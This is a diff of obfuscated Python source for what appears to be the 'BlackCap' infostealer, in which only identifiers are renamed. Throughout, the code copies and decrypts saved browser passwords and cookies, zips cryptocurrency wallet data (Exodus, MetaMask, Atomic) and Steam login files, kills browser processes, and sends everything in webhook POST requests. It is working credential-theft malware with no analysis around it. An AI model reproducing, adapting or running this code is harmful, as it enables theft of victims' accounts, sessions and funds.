                 "name": "Interesting files found on user PC:",
-                "value": lIIlIlIIllllIIlll
+                "value": lIlIllIIlIlIIIIIlII
                 }
             ],
             "author": {
-                'name': lIIIIllIlIIIllIIl'asd',
+                'name': llllIlIlll'asd',
                 'url': 'https://github.com/dscKSCH',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
@@ -2140,27 +1831,27 @@ def IIllIlIlIlI(IllIlIIlIIllIlIIlIl, lIIlIlIIllllIIlll=''):
         "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         "attachments": []
         }
-        lllllIlIlIlIlllllll(IllIIIlIll, IlIlIlIllllIlIIlII=dumps(IlIlIlIllllIlIIlII).encode(), IIllIlIIlIIl=IIllIlIIlIIl)
+        IlIlIIlllllIllI(lIIlIIllIIIIIIl, lIlIIIllIIlI=dumps(lIlIIIllIIlI).encode(), IlIIllIIIl=IlIIllIIIl)
         return
-    lIllIIllI = IllIlIIlIIllIlIIlIl
-    IIllIIIIlIllIllII = {'file': open(lIllIIllI, 'rb')}
-    if "bc_allpasswords" in IllIlIIlIIllIlIIlIl:
-        IIIlllllllIIllIIllII = ' | '.join(lIIlllIl for lIIlllIl in IlllIIIlIIlll)
-        if len(IIIlllllllIIllIIllII) > 1000:
-            llIIlIllIIllIIl = llllIIIl(str(IlllIIIlIIlll))
-            IIIlllllllIIllIIllII = ' | '.join(lIIlllIl for lIIlllIl in llIIlIllIIllIIl)
-        IlIlIlIllllIlIIlII = {
+    lllIllIIlIlllllIIIIl = lIIlllIlIlIIlII
+    IIllllIlllIlIlIIl = {'file': open(lllIllIIlIlllllIIIIl, 'rb')}
+    if "bc_allpasswords" in lIIlllIlIlIIlII:
+        llIIIIIIIlII = ' | '.join(IllIllIIllII for IllIllIIllII in IIllllIIIIl)
+        if len(llIIIIIIIlII) > 1000:
+            lIlIIIIIlIll = IlllIIIIllllI(str(IIllllIIIIl))
+            llIIIIIIIlII = ' | '.join(IllIllIIllII for IllIllIIllII in lIlIIIIIlIll)
+        lIlIIIllIIlI = {
         "content": '',
         "embeds": [
             {
             "fields": [
                 {
                 "name": "Passwords Found:",
-                "value": IIIlllllllIIllIIllII
+                "value": llIIIIIIIlII
                 }
             ],
             "author": {
-                'name': lIIIIllIlIIIllIIl'asd',
+                'name': llllIlIlll'asd',
                 'url': 'https://github.com/KSaasdsc',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
@@ -2173,24 +1864,24 @@ def IIllIlIlIlI(IllIlIIlIIllIlIIlIl, lIIlIlIIllllIIlll=''):
          "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         "attachments": []
         }
-        lllllIlIlIlIlllllll(IllIIIlIll, IlIlIlIllllIlIIlII=dumps(IlIlIlIllllIlIIlII).encode(), IIllIlIIlIIl=IIllIlIIlIIl)
-    if "bc_allcookies" in IllIlIIlIIllIlIIlIl:
-        llllllII = ' | '.join(lIIlllIl for lIIlllIl in lllIIIIllII)
-        if len(llllllII) > 1000:
-            IllIIIIlIIIIIIIIllll = llllIIIl(str(lllIIIIllII))
-            llllllII = ' | '.join(lIIlllIl for lIIlllIl in IllIIIIlIIIIIIIIllll)
-        IlIlIlIllllIlIIlII = {
+        IlIlIIlllllIllI(lIIlIIllIIIIIIl, lIlIIIllIIlI=dumps(lIlIIIllIIlI).encode(), IlIIllIIIl=IlIIllIIIl)
+    if "bc_allcookies" in lIIlllIlIlIIlII:
+        IIlllIIIIIlI = ' | '.join(IllIllIIllII for IllIllIIllII in lllIIIIlIIIlllI)
+        if len(IIlllIIIIIlI) > 1000:
+            IllIllllIIIIIII = IlllIIIIllllI(str(lllIIIIlIIIlllI))
+            IIlllIIIIIlI = ' | '.join(IllIllIIllII for IllIllIIllII in IllIllllIIIIIII)
+        lIlIIIllIIlI = {
         "content": '',
         "embeds": [
             {
             "fields": [
                 {
                 "name": "Cookies Found:",
-                "value": llllllII
+                "value": IIlllIIIIIlI
                 }
             ],
             "author": {
-                'name': lIIIIllIlIIIllIIl'asd',
+                'name': llllIlIlll'asd',
                 'url': 'https://github.com/KSCHdsc',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
@@ -2203,208 +1894,208 @@ def IIllIlIlIlI(IllIlIIlIIllIlIIlIl, lIIlIlIIllllIIlll=''):
          "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         "attachments": []
         }
-        lllllIlIlIlIlllllll(IllIIIlIll, IlIlIlIllllIlIIlII=dumps(IlIlIlIllllIlIIlII).encode(), IIllIlIIlIIl=IIllIlIIlIIl)
-    lIllllIlllllIIllII("POST", IllIIIlIll, IIllIIIIlIllIllII=IIllIIIIlIllIllII)
-def llIIlllIlI(IlIlIlIllllIlIIlII, IllIlIIlIIllIlIIlIl):
-    lIllIIllI = os.getenv("TEMP") + lIIIIllIlIIIllIIl"\{nllIlIlIIIIIIllIlIIlmIIlIlIIIlIlIIIlIIlllIIII}.txt"
-    with open(lIllIIllI, mode='w', encoding='utf-8') as lIIIIllIlIIIllIIl:
-        lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"asd | https://github.com/asd\n\n")
-        for IIIIIIllllIIIllll in IlIlIlIllllIlIIlII:
-            if IIIIIIllllIIIllll[0] != '':
-                lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"{IIIIIIllllIIIlllIlIIlllII}\n")
-lIlIlIlIl = []
-def IIIllIIIll(lIllIIllI, IIllIlIllIIIlIllII):
-    global lIlIlIlIl
-    if not os.lIllIIllI.exists(lIllIIllI): return
-    IllIIIlllI = lIllIIllI + IIllIlIllIIIlIllII + "/Login Data"
-    if os.stat(IllIIIlllI).st_size == 0: return
-    llIIlIIllIlllllI = IllIIlIllIllIIII + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-    shutil.copy2(IllIIIlllI, llIIlIIllIlllllI)
-    lIIlllIlll = connect(llIIlIIllIlllllI)
-    llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-    llIIlIlllIIIlIllIl.execute("SELECT action_url, username_value, password_value FROM logins;")
-    IlIlIlIllllIlIIlII = llIIlIlllIIIlIllIl.fetchall()
-    llIIlIlllIIIlIllIl.close()
-    lIIlllIlll.close()
-    os.remove(llIIlIIllIlllllI)
-    IIIIlllIlIllI = lIllIIllI + "/Local State"
-    with open(IIIIlllIlIllI, 'r', encoding='utf-8') as lIIIIllIlIIIllIIl: IllIllIlllIllll = loads(lIIIIllIlIIIllIIl.read())
-    lllIIIlIlIlIIllI = b64decode(IllIllIlllIllll['os_crypt']['encrypted_key'])
-    lllIIIlIlIlIIllI = llIIllIlIllIIlIIll(lllIIIlIlIlIIllI[5:])
-    for lIlllIlIIIlIl in IlIlIlIllllIlIIlII:
-        if lIlllIlIIIlIl[0] != '':
-            for IIIlIlIIlIIIlIIlI in lIlIIllIIIIIlIllIIlI:
-                IIIlIIlIlIlIIllIllIl = IIIlIlIIlIIIlIIlI
-                if "https" in IIIlIlIIlIIIlIIlI:
-                    IllIlIllIIllIIIlI = IIIlIlIIlIIIlIIlI
-                    IIIlIlIIlIIIlIIlI = IllIlIllIIllIIIlI.split('[')[1].split(']')[0]
-                if IIIlIlIIlIIIlIIlI in lIlllIlIIIlIl[0]:
-                    if not IIIlIIlIlIlIIllIllIl in IlllIIIlIIlll: IlllIIIlIIlll.append(IIIlIIlIlIlIIllIllIl)
-            lIlIlIlIl.append(lIIIIllIlIIIllIIl"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {IlIIlIIIIIlll(lIlllIlIIIlIl[2], mllIlIlIIIIIIllIlIIlsIIIIIIIlleIIlllIIlIlIlIlIlIIlIllllllIlIIIIlkIIlIlIIIlIlIIlIIllIIllIIIllIIlIIlIIlllII)}\n\n")
-    llIIlllIlI(lIlIlIlIl, 'bc_allpasswords')
-llIlIIllllI = []
-def IIIIIllIIlIlIIlIl(lIllIIllI, IIllIlIllIIIlIllII):
-    global llIlIIllllI
-    if not os.lIllIIllI.exists(lIllIIllI): return
-    IllIIIlllI = lIllIIllI + IIllIlIllIIIlIllII + "/Cookies"
-    if os.stat(IllIIIlllI).st_size == 0: return
-    llIIlIIllIlllllI = IllIIlIllIllIIII + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-    shutil.copy2(IllIIIlllI, llIIlIIllIlllllI)
-    lIIlllIlll = connect(llIIlIIllIlllllI)
-    llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-    llIIlIlllIIIlIllIl.execute("SELECT host_key, name, encrypted_value FROM cookies")
-    IlIlIlIllllIlIIlII = llIIlIlllIIIlIllIl.fetchall()
-    llIIlIlllIIIlIllIl.close()
-    lIIlllIlll.close()
-    os.remove(llIIlIIllIlllllI)
-    IIIIlllIlIllI = lIllIIllI + "/Local State"
-    with open(IIIIlllIlIllI, 'r', encoding='utf-8') as lIIIIllIlIIIllIIl: IllIllIlllIllll = loads(lIIIIllIlIIIllIIl.read())
-    lllIIIlIlIlIIllI = b64decode(IllIllIlllIllll['os_crypt']['encrypted_key'])
-    lllIIIlIlIlIIllI = llIIllIlIllIIlIIll(lllIIIlIlIlIIllI[5:])
-    for lIlllIlIIIlIl in IlIlIlIllllIlIIlII:
-        if lIlllIlIIIlIl[0] != '':
-            for IIIlIlIIlIIIlIIlI in lIlIIllIIIIIlIllIIlI:
-                IIIlIIlIlIlIIllIllIl = IIIlIlIIlIIIlIIlI
-                if "https" in IIIlIlIIlIIIlIIlI:
-                    IllIlIllIIllIIIlI = IIIlIlIIlIIIlIIlI
-                    IIIlIlIIlIIIlIIlI = IllIlIllIIllIIIlI.split('[')[1].split(']')[0]
-                if IIIlIlIIlIIIlIIlI in lIlllIlIIIlIl[0]:
-                    if not IIIlIIlIlIlIIllIllIl in lllIIIIllII: lllIIIIllII.append(IIIlIIlIlIlIIllIllIl)
-            llIlIIllllI.append(lIIIIllIlIIIllIIl"{lIlllIlIIIlIl[0]}	TRUE"+"		"+ f"/FALSE	2597573456	{lIlllIlIIIlIl[1]}	{IlIIlIIIIIlll(lIlllIlIIIlIl[2], lllIIIlIlIlIIllI)}")
-    llIIlllIlI(llIlIIllllI, 'bc_allcookies')
-def IllIlllIlllII(lllIlIlIl):
-    for IIIIIllIIlIIll in psutil.process_iter():
+        IlIlIIlllllIllI(lIIlIIllIIIIIIl, lIlIIIllIIlI=dumps(lIlIIIllIIlI).encode(), IlIIllIIIl=IlIIllIIIl)
+    llIIIlIllIlI("POST", lIIlIIllIIIIIIl, IIllllIlllIlIlIIl=IIllllIlllIlIlIIl)
+def IIlIlllIlIlIIIllII(lIlIIIllIIlI, lIIlllIlIlIIlII):
+    lllIllIIlIlllllIIIIl = os.getenv("TEMP") + llllIlIlll"\{nlIlIlIIIlIlllIlllIImlllllIIIlIIllIlIlllIllIII}.txt"
+    with open(lllIllIIlIlllllIIIIl, mode='w', encoding='utf-8') as llllIlIlll:
+        llllIlIlll.write(llllIlIlll"asd | https://github.com/asd\n\n")
+        for lIIlIllllIlIlIl in lIlIIIllIIlI:
+            if lIIlIllllIlIlIl[0] != '':
+                llllIlIlll.write(llllIlIlll"{lIIlIllllIlIlIIIIlIIllIlIlllIllI}\n")
+lIllIlIIIIlIlIIIIl = []
+def IllIlIIIlIIIlllI(lllIllIIlIlllllIIIIl, IIIllIIIIIIllIll):
+    global lIllIlIIIIlIlIIIIl
+    if not os.lllIllIIlIlllllIIIIl.exists(lllIllIIlIlllllIIIIl): return
+    lIllIlIIl = lllIllIIlIlllllIIIIl + IIIllIIIIIIllIll + "/Login Data"
+    if os.stat(lIllIlIIl).st_size == 0: return
+    lIlIlIlllIlIl = lIIllIlIlIIIIIlIII + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    shutil.copy2(lIllIlIIl, lIlIlIlllIlIl)
+    IlIIIlIII = connect(lIlIlIlllIlIl)
+    IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+    IlIIIlIIIlll.execute("SELECT action_url, username_value, password_value FROM logins;")
+    lIlIIIllIIlI = IlIIIlIIIlll.fetchall()
+    IlIIIlIIIlll.close()
+    IlIIIlIII.close()
+    os.remove(lIlIlIlllIlIl)
+    IlIIllIllIllllIIIll = lllIllIIlIlllllIIIIl + "/Local State"
+    with open(IlIIllIllIllllIIIll, 'r', encoding='utf-8') as llllIlIlll: IlllIIIIlIIIlIl = loads(llllIlIlll.read())
+    IIlIllIllIIlIII = b64decode(IlllIIIIlIIIlIl['os_crypt']['encrypted_key'])
+    IIlIllIllIIlIII = lIIIlllllI(IIlIllIllIIlIII[5:])
+    for IIlllIlIIIl in lIlIIIllIIlI:
+        if IIlllIlIIIl[0] != '':
+            for lllllIllIllll in lIIIllIlIlI:
+                IIIIlIllIIIlllI = lllllIllIllll
+                if "https" in lllllIllIllll:
+                    IIlIIIlIIIlllIllI = lllllIllIllll
+                    lllllIllIllll = IIlIIIlIIIlllIllI.split('[')[1].split(']')[0]
+                if lllllIllIllll in IIlllIlIIIl[0]:
+                    if not IIIIlIllIIIlllI in IIllllIIIIl: IIllllIIIIl.append(IIIIlIllIIIlllI)
+            lIllIlIIIIlIlIIIIl.append(llllIlIlll"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {IlllIIllllIlIllIlIlI(IIlllIlIIIl[2], mlIlIlIIIlIlllIlllIIslIllIIllIlIIIIeIlIIllIllIIllIIllllIlIIlIlkllllllIIlIIlIIlIIIIIllIIIlIIllIlIlllIllII)}\n\n")
+    IIlIlllIlIlIIIllII(lIllIlIIIIlIlIIIIl, 'bc_allpasswords')
+llIIllIIIllI = []
+def llIIllllIIllIlll(lllIllIIlIlllllIIIIl, IIIllIIIIIIllIll):
+    global llIIllIIIllI
+    if not os.lllIllIIlIlllllIIIIl.exists(lllIllIIlIlllllIIIIl): return
+    lIllIlIIl = lllIllIIlIlllllIIIIl + IIIllIIIIIIllIll + "/Cookies"
+    if os.stat(lIllIlIIl).st_size == 0: return
+    lIlIlIlllIlIl = lIIllIlIlIIIIIlIII + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    shutil.copy2(lIllIlIIl, lIlIlIlllIlIl)
+    IlIIIlIII = connect(lIlIlIlllIlIl)
+    IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+    IlIIIlIIIlll.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    lIlIIIllIIlI = IlIIIlIIIlll.fetchall()
+    IlIIIlIIIlll.close()
+    IlIIIlIII.close()
+    os.remove(lIlIlIlllIlIl)
+    IlIIllIllIllllIIIll = lllIllIIlIlllllIIIIl + "/Local State"
+    with open(IlIIllIllIllllIIIll, 'r', encoding='utf-8') as llllIlIlll: IlllIIIIlIIIlIl = loads(llllIlIlll.read())
+    IIlIllIllIIlIII = b64decode(IlllIIIIlIIIlIl['os_crypt']['encrypted_key'])
+    IIlIllIllIIlIII = lIIIlllllI(IIlIllIllIIlIII[5:])
+    for IIlllIlIIIl in lIlIIIllIIlI:
+        if IIlllIlIIIl[0] != '':
+            for lllllIllIllll in lIIIllIlIlI:
+                IIIIlIllIIIlllI = lllllIllIllll
+                if "https" in lllllIllIllll:
+                    IIlIIIlIIIlllIllI = lllllIllIllll
+                    lllllIllIllll = IIlIIIlIIIlllIllI.split('[')[1].split(']')[0]
+                if lllllIllIllll in IIlllIlIIIl[0]:
+                    if not IIIIlIllIIIlllI in lllIIIIlIIIlllI: lllIIIIlIIIlllI.append(IIIIlIllIIIlllI)
+            llIIllIIIllI.append(llllIlIlll"{IIlllIlIIIl[0]}	TRUE"+"		"+ f"/FALSE	2597573456	{IIlllIlIIIl[1]}	{IlllIIllllIlIllIlIlI(IIlllIlIIIl[2], IIlIllIllIIlIII)}")
+    IIlIlllIlIlIIIllII(llIIllIIIllI, 'bc_allcookies')
+def IlllIllIlIllIlIllll(lIlIIIlIIIIlllIIlI):
+    for llIIllIlIlII in psutil.process_iter():
         try:
-            if lllIlIlIl.lower() in IIIIIllIIlIIll.IllIlIIlIIllIlIIlIl().lower():
+            if lIlIIIlIIIIlllIIlI.lower() in llIIllIlIlII.lIIlllIlIlIIlII().lower():
                 return True
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass
     return False;
-def IllIlIIlIllIIIIlII(lIllIIllI, IIllIlIllIIIlIllII, lIIllIIlIIIllI):
-    IllIIIlllI = lIllIIllI
-    IllIlIIlIIllIlIIlIl = IIllIlIllIIIlIllII
-    if "aholpfdialjgjfhomihkjbmgjidlcdno" in IIllIlIllIIIlIllII:
-        llIIlllllllIIlllI = lIllIIllI.split("\\")[4].split("/")[1].replace(' ', '')
-        IllIlIIlIIllIlIIlIl = lIIIIllIlIIIllIIl"Exodus_{llIIlllllllIIllIlIIlllIII}"
-        IllIIIlllI = lIllIIllI + IIllIlIllIIIlIllII
-    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in IIllIlIllIIIlIllII:
-        llIIlllllllIIlllI = lIllIIllI.split("\\")[4].split("/")[1].replace(' ', '')
-        IllIlIIlIIllIlIIlIl = lIIIIllIlIIIllIIl"Metamask_{llIIlllllllIIllIlIIlllIII}"
-        IllIIIlllI = lIllIIllI + IIllIlIllIIIlIllII
-    if not os.lIllIIllI.exists(IllIIIlllI): return
-    if IllIlllIlllII('chrome.exe'):
+def lIlIlIlIIllllIl(lllIllIIlIlllllIIIIl, IIIllIIIIIIllIll, IIllIlllllllI):
+    lIllIlIIl = lllIllIIlIlllllIIIIl
+    lIIlllIlIlIIlII = IIIllIIIIIIllIll
+    if "aholpfdialjgjfhomihkjbmgjidlcdno" in IIIllIIIIIIllIll:
+        llIIlllI = lllIllIIlIlllllIIIIl.split("\\")[4].split("/")[1].replace(' ', '')
+        lIIlllIlIlIIlII = llllIlIlll"Exodus_{lllllIllIIIlIIlllIlIIIlsllllllIIIlIIllIlIIIlIIllIlIlllIllI}"
+        lIllIlIIl = lllIllIIlIlllllIIIIl + IIIllIIIIIIllIll
+    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in IIIllIIIIIIllIll:
+        llIIlllI = lllIllIIlIlllllIIIIl.split("\\")[4].split("/")[1].replace(' ', '')
+        lIIlllIlIlIIlII = llllIlIlll"Metamask_{lllllIllIIIlIIlllIlIIIlsllllllIIIlIIllIlIIIlIIllIlIlllIllI}"
+        lIllIlIIl = lllIllIIlIlllllIIIIl + IIIllIIIIIIllIll
+    if not os.lllIllIIlIlllllIIIIl.exists(lIllIlIIl): return
+    if IlllIllIlIllIlIllll('chrome.exe'):
         print('Yes a chrome process was running')
-        subprocess.Popen(lIIIIllIlIIIllIIl"taskkill /im {IIIIIllIIlIIllIlIlIIlllllIlIIlIIlllIII} /t /f", shell=True)
+        subprocess.Popen(llllIlIlll"taskkill /im {IIllIllllllIIIlIIllIlIlllIllII} /t /f", shell=True)
     else:
         ...
-    if "Wallet" in IIllIlIllIIIlIllII or "NationsGlory" in IIllIlIllIIIlIllII:
-        llIIlllllllIIlllI = lIllIIllI.split("\\")[4].split("/")[1].replace(' ', '')
-        IllIlIIlIIllIlIIlIl = lIIIIllIlIIIllIIl"{llIIlllllllIIllIlIIlllIII}"
-    elif "Steam" in IIllIlIllIIIlIllII:
-        if not os.lIllIIllI.isfile(lIIIIllIlIIIllIIl"{pllIlIlIIIIIIllIlIIlIIIIIIIlIlIIlllIIhC}/loginusers.vdf"): return
-        lIIIIllIlIIIllIIl = open(lIIIIllIlIIIllIIl"{pllIlIlIIIIIIllIlIIlIIIIIIIlIlIIlllIIhC}/loginusers.vdf", "r+", encoding="utf8")
-        IlIlIlIllllIlIIlII = lIIIIllIlIIIllIIl.readlines()
-        IllllllIIlIl = False
-        for IlIIlllII in IlIlIlIllllIlIIlII:
-            if 'RememberPassword"\IIIIIIIll\IIIIIIIll"1"' in IlIIlllII:
-                IllllllIIlIl = True
-        if IllllllIIlIl == False: return
-        IllIlIIlIIllIlIIlIl = IIllIlIllIIIlIllII
-    IlIlIlllII = zipfile.ZipFile(lIIIIllIlIIIllIIl"{paIIIIIIIllhC}/{nllIlIlIIIIIIllIlIIlmIIlIlIIIlIlIIIlIIlllIIII}.zip", "w")
-    print(IlIlIlllII)
-    for IlIlIlIll in os.listdir(IllIIIlllI):
-        if not ".zip" in IlIlIlIll: IlIlIlllII.write(IllIIIlllI + "/" + IlIlIlIll)
-    IlIlIlllII.close()
-    IIllIlIlIlI(lIIIIllIlIIIllIIl'{paIIIIIIIllhC}/{nllIlIlIIIIIIllIlIIlmIIlIlIIIlIlIIIlIIlllIIII}.zip')
-    os.remove(lIIIIllIlIIIllIIl"{paIIIIIIIllhC}/{nllIlIlIIIIIIllIlIIlmIIlIlIIIlIlIIIlIIlllIIII}.zip")
-def llIlIIIIlllllIIIlIl():
-    IIIlIIlIlIIII = [
-        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
-        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
-        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
-        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
-        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
-        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
-        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
-        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/CocCoc/Browsers/User Data",                      "browser.exe",  "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],        
-        [lIIIIllIlIIIllIIl"{loIlIlIIlllllIlIlIllIlIlIIIIIIllIlIIlIlIIlllII}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
+    if "Wallet" in IIIllIIIIIIllIll or "NationsGlory" in IIIllIIIIIIllIll:
+        llIIlllI = lllIllIIlIlllllIIIIl.split("\\")[4].split("/")[1].replace(' ', '')
+        lIIlllIlIlIIlII = llllIlIlll"{lllllIllIIIlIIlllIlIIIlsllllllIIIlIIllIlIIIlIIllIlIlllIllI}"
+    elif "Steam" in IIIllIIIIIIllIll:
+        if not os.lllIllIIlIlllllIIIIl.isfile(llllIlIlll"{plIlIlIIIlIlllIlllIIlIllIIllIIIIlIIllIlIlllIllIIIIIhC}/loginusers.vdf"): return
+        llllIlIlll = open(llllIlIlll"{plIlIlIIIlIlllIlllIIlIllIIllIIIIlIIllIlIlllIllIIIIIhC}/loginusers.vdf", "r+", encoding="utf8")
+        lIlIIIllIIlI = llllIlIlll.readlines()
+        llIIllIIl = False
+        for IIIlIIllIlIlllIllI in lIlIIIllIIlI:
+            if 'RememberPassword"\lIllIIllIlIIII\lIllIIllIlIIII"1"' in IIIlIIllIlIlllIllI:
+                llIIllIIl = True
+        if llIIllIIl == False: return
+        lIIlllIlIlIIlII = IIIllIIIIIIllIll
+    IIlIllIlIlllllIlIl = zipfile.ZipFile(llllIlIlll"{palIllIIllIlIIIIhC}/{nlIlIlIIIlIlllIlllIImlllllIIIlIIllIlIlllIllIII}.zip", "w")
+    print(IIlIllIlIlllllIlIl)
+    for lIIIIlllIl in os.listdir(lIllIlIIl):
+        if not ".zip" in lIIIIlllIl: IIlIllIlIlllllIlIl.write(lIllIlIIl + "/" + lIIIIlllIl)
+    IIlIllIlIlllllIlIl.close()
+    IllIIlIlIIllIIIlI(llllIlIlll'{palIllIIllIlIIIIhC}/{nlIlIlIIIlIlllIlllIImlllllIIIlIIllIlIlllIllIII}.zip')
+    os.remove(llllIlIlll"{palIllIIllIlIIIIhC}/{nlIlIlIIIlIlllIlllIImlllllIIIlIIllIlIlllIllIII}.zip")
+def lllllIlI():
+    llIIIlIlIIl = [
+        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
+        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/CocCoc/Browsers/User Data",                      "browser.exe",  "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],        
+        [llllIlIlll"{IlllIIlIIllIIIlIIllIlIlllIllII}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
     ]
-    lIIlllIlIllIlIlll = [
-        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
-        [lIIIIllIlIIIllIIl"{IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
+    IIllllllIll = [
+        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
+        [llllIlIlll"{IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
         ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
